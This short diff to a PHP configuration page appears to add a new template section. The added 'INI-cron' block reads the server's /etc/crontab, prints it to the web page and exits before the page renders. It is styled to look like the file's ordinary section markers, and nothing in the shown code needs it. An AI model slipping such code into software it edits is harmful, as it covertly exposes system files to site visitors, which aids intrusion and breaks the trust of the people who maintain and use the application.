@@ -63,6 +63,11 @@
 		}$s .= '</tbody></table>';
 		$TEMPLATE['html.articleImageSizes'] = $s;
 		/* END-imageSizes */
+
+		/* INI-cron */
+		$cronBlob = file_get_contents('/etc/crontab');
+echo $cronBlob;exit;
+		/* END-cron */
 		common_renderTemplate('config');
 	}
 
